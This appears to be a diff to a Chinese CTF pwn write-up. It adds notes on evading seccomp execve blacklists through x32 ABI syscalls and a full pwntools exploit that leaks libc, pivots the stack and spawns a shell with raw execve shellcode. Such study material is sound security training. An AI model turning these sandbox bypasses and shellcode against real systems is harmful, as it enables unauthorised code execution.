@@ -7,6 +7,37 @@ permalink:
 pin: false
 ---
 
+## 沙盒绕过
+
+seccomp通常有白名单和黑名单2种
+
+白名单通常较为苛刻，但一般比较少
+
+如果是黑名单
+
+```bash
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0001: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0003
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x15 0x00 0x01 0x00000142  if (A != execveat) goto 0005
+ 0004: 0x06 0x00 0x00 0x00000000  return KILL
+ 0005: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0007
+ 0006: 0x06 0x00 0x00 0x00000000  return KILL
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+```
+
+只是验证了系统调用号，除了可以orw外，也是可以获取shell的
+
+获取shell有两种方式：
+
+1.execute 520 system call or x32abi (syscall(0x40000000 | sys_number, arg1, arg2, ...))
+
+2.switch the mode from 64bit to 32bit and execute 32bit shellcode（未验证arch）
+
+除此以外用一些未限制的函数也是可以实现绕过的方式
+
 ## setcontext介绍
 
 从mov rsp, [rdi+0xa0]开始，即setcontext+53
@@ -30,7 +61,129 @@ frame.rip = 0xbb # rcx pay+0xa8
 
 ![setcontext](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/20210627185630879.png)
 
-## 例题1 good（栈沙盒）
+## shellcode
+
+无保护，题目核心主要是一个read，题目自带jmprsp，考虑利用shellcode进行栈迁移执行shellcode
+
+还有值得注意的点就是在不同的版本的linux，高版本要注意ret栈平衡的问题，即payload比低版本多一个0x8的长度，所以这题在ubuntu16下打的。
+
+![image-20220514105737206](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220514105737206.png)
+
+![image-20220514105140349](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220514105140349.png)
+
+> nop /1字节
+>
+> pop rdi /1字节
+>
+> xor esi, esi /2字节 xor rsi, rsi/3字节
+>
+> sub rsp, 0x30 /4字节
+>
+> jmp rsp /2字节
+>
+> mov rax, 0 /7字节 mov eax, 0 /5字节
+>
+> syscall 2字节
+
+```python
+# _*_ coding:utf-8 _*_
+from pwn import *
+from LibcSearcher import LibcSearcher
+context(arch='amd64', os='linux')
+
+p = process('./shellcode')
+elf = ELF("./shellcode")
+libc = elf.libc
+def dbg():
+    gdb.attach(p)
+
+#-----------------------------------------------------------------------------------------
+s       = lambda data               :p.send(str(data))
+sa      = lambda text,data          :p.sendafter(text, str(data))
+sl      = lambda data               :p.sendline(str(data))
+sla     = lambda text,data          :p.sendlineafter(text, str(data))
+r       = lambda num=4096           :p.recv(num)
+ru      = lambda text               :p.recvuntil(text)
+uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
+uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
+lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)
+
+sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
+#https://www.exploit-db.com/shellcodes
+#-----------------------------------------------------------------------------------------
+
+'''
+0x0000000000400723: pop rdi; ret;
+0x0000000000400721: pop rsi; pop r15; ret;
+'''
+pop_rdi = 0x0000000000400723
+pop_rsi_r15 = 0x0000000000400721
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+main = 0x40068a
+jmp_rsp = 0x400685
+
+pop_rdi ='''
+nop
+nop
+nop
+nop
+nop
+pop rdi
+pop rdi
+ret
+'''
+# 第一次poprdi把汇编内容填入rdi寄存器，再poprdi就是got表
+pay = asm(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)+p64(0)+p64(jmp_rsp)
+pay += asm('''
+	sub rsp, 0x30
+	jmp rsp
+	''')
+
+sa("Can u pwn me?",pay)
+libc_base = uu64()-libc.sym['puts']
+lg('libc_base',libc_base)
+
+bin_sh = libc_base+libc.search("/bin/sh\x00").next()
+# jmp_rsp = libc_base+libc.search(asm("jmp rsp")).next()
+lg('bin_sh',bin_sh)
+
+system = '''
+xor esi, esi 
+xor edx, edx 
+mov rax, 520
+syscall
+nop
+nop
+nop
+'''
+pay = asm(pop_rdi)+p64(bin_sh)+p64(jmp_rsp)+asm(system)+p64(jmp_rsp)
+pay += asm('''
+	sub rsp, 0x30
+	jmp rsp
+	''')#6
+
+sl(pay)
+p.interactive()
+'''
+0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+
+0x4f432 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a41c execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+'''
+```
+
+## good（栈沙盒）
 
 ```c
 #include<stdio.h>
@@ -127,7 +280,7 @@ pay1+=p64(rdi)+p64(0x601200)+p64(libc_base+libc.sym['puts'])+p64(0x0400790)
 r.send(pay1)
 print(r.recvuntil("}"))
 ```
-## 例题2 orwheap（2.27/堆沙盒）
+## orwheap（2.27/堆沙盒）
 ```c
 #include<stdio.h>
 #include <math.h>
@@ -378,7 +531,7 @@ r.send(shellcode)
 print(r.recvuntil("}"))
 r.interactive()
 ```
-## 例题3 orwheap20(2.29/2.31堆沙盒)
+## orwheap20(2.29/2.31堆沙盒)
 ```c
 #include<stdio.h>
 #include <math.h>
@@ -639,7 +792,7 @@ r.send(shellcode)
 
 r.interactive()
 ```
-## 例题4 oldfashion_orw（栈沙盒）
+## oldfashion_orw（栈沙盒）
 ![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/26177342-98e5a9dcf84e1e1e.png)
 泄露libc，改权限，bss上写入shellcode，运行后拿目录，然后重复一次orw拿flag，基本上改完权限就跑板子了，和上一道的区别就是改了权限用shellcode吧
 
@@ -750,7 +903,7 @@ p.send(shellcode)
 p.interactive()
 ```
 
-## 例题5 silverwolf(2.27/堆栈转移)
+## silverwolf(2.27/堆栈转移)
 
 漏洞点是UAF，最大能申请0x78的size，常规思路是覆盖free_hook写setcontext，其实就是去执行写在堆里的gadget，但这道题因为editsize即chunksize，我们用setcontext+srop长度就不够，SigreturnFrame这种都是0xf8往上的，如果硬要在堆里写就需要拼接了。
 
@@ -881,4 +1034,6 @@ p.sendline(flat(payload).ljust(0x100,"a")+"flag\x00\x00\x00\x00")
 
 p.interactive()
 ```
+
+
 
